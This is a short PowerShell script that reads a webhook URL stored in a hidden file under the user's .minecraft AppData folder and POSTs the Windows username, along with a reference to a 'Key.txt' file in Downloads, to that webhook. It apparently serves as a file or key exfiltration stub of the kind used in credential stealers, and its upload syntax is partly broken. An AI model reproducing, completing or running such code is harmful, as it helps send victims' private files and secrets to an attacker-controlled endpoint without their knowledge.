$webhook = "C:\Users\$env:username\AppData\Roaming\.minecraft\webhook.txt"
$webHookUrl = Get-Content -Path $webhook -Raw

$Body = @{
  'username' = $env:username
  'content' = "this is a test"
  "file=@C:\Users\$env:username\Downloads\Key.txt"
}

Invoke-WebRequest -uri $webHookUrl -Method POST -Body (ConvertTo-Json $Body) -Headers @{'Content-Type' = 'application/json'}
